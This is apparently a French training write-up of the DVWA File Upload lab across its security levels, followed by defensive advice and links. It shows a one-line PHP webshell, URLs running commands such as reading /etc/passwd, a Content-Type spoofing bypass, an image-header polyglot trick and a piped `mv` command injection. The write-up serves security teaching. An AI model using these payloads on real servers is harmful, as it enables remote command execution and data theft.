# DVWA File Upload

## Objectif du module

Le module DVWA File Upload montre comment un upload mal filtré permet d’envoyer un fichier malveillant (webshell) sur le serveur et de l’exécuter pour obtenir une exécution de commandes à distance (RCE).  
Dans DVWA, les fichiers envoyés sont stockés dans un répertoire d’upload accessible via le navigateur, ce qui rend l’exploitation très directe.  

## Niveau Low

Au niveau Low, l’application dépose le fichier uploadé dans le répertoire prévu sans vérifier ni l’extension, ni le type MIME, ni le contenu du fichier.  

``` txt
Faire un test avec n'importe quel fichier (txt, jpg ...)  
Réponse : ../../hackable/uploads/shell.txt succesfully uploaded!  
Alors visble : http://127.0.0.1:42001/hackable/uploads/shell.txt
ou  http://127.0.0.1:42001/hackable/uploads/shell.txt
```

**Étapes d’exploitation typiques** :  

1. Créer un fichier `shell.php` contenant, par exemple, `<?php system($_GET['cmd']); ?>`.  
2. Régler DVWA sur `security = low` puis ouvrir le module File Upload.  
3. Envoyer `shell.php` via le formulaire (aucune protection ne bloque ce type de fichier).  
4. Noter l’URL de stockage renvoyée par DVWA, par exemple `http://127.0.0.1/dvwa/hackable/uploads/shell.php`.  
5. Appeler cette URL avec un paramètre comme `?cmd=id` ou `?cmd=whoami` pour vérifier l’exécution de commandes système.  

``` url
http://127.0.0.1:42001/hackable/uploads/shell.php?cmd=id
http://127.0.0.1:42001/hackable/uploads/shell.php?cmd=cat%20/etc/passwd
```

En variante, on peut remplacer le shell simple par un payload de reverse shell (php-reverse-shell, msfvenom) afin d’illustrer une session interactive sur le serveur.  

## Niveau Medium

Au niveau Medium, DVWA introduit des contrôles basés principalement sur l’extension et le type de contenu déclarés, mais sans analyse réelle du contenu du fichier.  

``` php
 if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) )
```

Si vous charger un fichier php :
Réponse : Your image was not uploaded. We can only accept JPEG or PNG images.

Bypass classique :  

1. Créer un webshell en le sauvegardant sous un nom du type `shell.php.jpg` ou `shell.php.jpeg`.  
2. Dans l’interface DVWA en Medium, envoyer ce fichier : l’application refuse souvent `shell.php` mais accepte `shell.php.jpg`.mais ne permet pas d'exécuter le shell contenu.  
3. Upload une image, Intercepter la requête HTTP avec un proxy (Burp), remplace image par shell.php* et modifier le `Content-Type` de la partie fichier en `image/jpeg` pour satisfaire les vérifications côté serveur.  
4. Une fois le fichier accepté, récupérer l’URL générée dans le message de confirmation.  
5. Appeler cette URL avec un paramètre `?cmd=id` comme au niveau Low pour valider la RCE.  

*Dans DVWA, la sélection de fichier se fait côté navigateur, donc si l’interface refuse shell.php (validation côté client ou simple filtrage d’extension), tu ne peux pas “forcer” le chargement de shell.php depuis Burp seul : Burp ne fait que modifier la requête, il ne peut pas ajouter un fichier qui n’a jamais été lu par le navigateur.

../../hackable/uploads/shell.php.jpeg succesfully uploaded!  via navigateur
Via Burp : à modifier
POST /vulnerabilities/upload/../../hackable/uploads/shell.php?cmd=id HTTP/1.1
Content-Type: imag/jpeg

**Conclusion** :
“On ne peut pas charger shell.php directement via le formulaire à ce niveau.”

“L’exploitation se fait en imitant la requête d’une image autorisée (Content-Type) et en visant à ce que le serveur enregistre un fichier exploitable (via un autre vecteur ou un fichier déjà en place) ou en faisant passer shell.php pour une image (voi 1 du niveau high) .”


## Niveau High

Au niveau High, DVWA renforce les contrôles sur le fichier :  

- Vérification stricte de l’extension (uniquement des images classiques, par exemple jpg/jpeg/png).  
- Contrôle de la taille maximale du fichier.  
- Vérification que le fichier ressemble réellement à une image via une fonction de type `getimagesize()`.  

```php

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) )
```

**Stratégies d’exploitation possibles** :  

1. Construire un fichier “polyglot” qui commence par un en-tête valide d’image (par exemple un header GIF ou JPEG **GIF89a;**) puis contient du code PHP plus bas dans le fichier.  
2. L’enregistrer sous un nom comme `shell.php.jpeg` pour satisfaire le filtre d’extension tout en gardant la possibilité d’être interprété par PHP si le serveur l’exécute.  
3. Uploader ce fichier au niveau High : la présence d’un en-tête d’image cohérent permet de passer la vérification de type basée sur l’analyse du contenu.  
4. Exploiter File Inclusion (FI) avec | mv /usr/share/dvwa/hackable/uploads/shell-medium.php.jpeg
/usr/share/dvwa/hackable/uploads/exploit.php et | ls /usr/share/dvwa/hackable/uploads/
5. Si la configuration serveur exécute encore du PHP dans le répertoire d’upload, il suffira de visiter l’URL et d’ajouter `?cmd=id` pour exécuter le webshell.  

```url
http://192.168.1.146:42001//hackable/uploads/exploit.php?cmd=id
```

Ce niveau est idéal pour montrer la différence entre “filtrage applicatif” et “configuration serveur” : même avec de meilleurs contrôles applicatifs, une configuration serveur trop permissive peut rendre l’exploitation encore possible.  

Autre POC : https://medium.com/@waeloueslati18/exploring-dvwa-a-walkthrough-of-the-file-upload-challenge-part-5-7ee8066e3bfa

## Bonnes pratiques défense

Côté application :  

- Appliquer une liste blanche stricte d’extensions autorisées et refuser systématiquement toute extension de script (php, phtml, asp, jsp, etc.).  
- Valider côté serveur la taille, l’extension, le type réel du fichier (par exemple via `getimagesize()` pour les images), sans jamais se fier uniquement aux données envoyées par le client.  
- Renommer systématiquement les fichiers à l’enregistrement (UUID, hash) et ne pas conserver d’éléments contrôlés par l’utilisateur dans le chemin ou le nom final.  

Côté serveur :  

- Placer les fichiers uploadés hors du répertoire servi par le serveur web, ou dans un dossier configuré pour servir uniquement des fichiers statiques sans interprétation de scripts.  
- Appliquer le principe du moindre privilège sur le compte système utilisé par le serveur web, afin de limiter l’impact d’une compromission.  

Surveillance et durcissement :  

- Journaliser les uploads (nom, taille, IP, type) et déclencher des alertes en cas de tailles anormales, d’extensions inattendues ou de comportements suspects.  
- Intégrer ces contrôles dans une démarche plus globale d’input validation et d’analyse de logs.  

## Ressources

## Article détaillé DVWA File Upload

- [spencerdodd.github](https://spencerdodd.github.io/2017/03/05/dvwa_file_upload/)
- [wargame.braincoke](https://wargame.braincoke.fr/labs/dvwa/dvwa-file-upload/)

## Walkthrough DVWA avec File Upload

- [github](https://github.com/jeel38/DVWA)
- [youtube](https://www.youtube.com/watch?v=B_s1qBT13Sk)
- [youtube](https://www.youtube.com/watch?v=K7XBQWAZdZ4)

## Lab PDF DVWA File Upload

- [elhacker](https://elhacker.info/Cursos/Certified%20Ethical%20Hacker-CEHv12-Practical%20hands%20on%20Labs/7.%20Hacking%20Web%20Applications%20and%20Web%20Servers/6.1%20File%20Upload%20on%20DVWA.pdf)
- [fr.scribd](https://fr.scribd.com/document/480161527/Lab8-Vishal-kumar-docx)

## Article sur l’exploitation des uploads

- [vaadata](https://www.vaadata.com/blog/fr/vulnerabilites-dupload-de-fichiers-exploitations-et-bonnes-pratiques-securite/)

## OWASP File Upload

- [cheatsheetseries.owasp](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

## OWASP Input Validation

- [cheatsheetseries.owasp](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## Tutoriels vidéo DVWA File Upload / RCE

- [youtube](https://www.youtube.com/watch?v=B_s1qBT13Sk)
- [youtube](https://www.youtube.com/watch?v=K7XBQWAZdZ4)
- [youtube](https://www.youtube.com/watch?v=5bAMYR-uIw0)
- [youtube](https://www.youtube.com/watch?v=NJixdFJq_Ac)
- [youtube](https://www.youtube.com/watch?v=GtZ_7GUXVJ8)
- [youtube](https://www.youtube.com/watch?v=vCEbu3O07W0)

---
[LinkedIn Bosjr](https://www.linkedin.com/in/bosjr)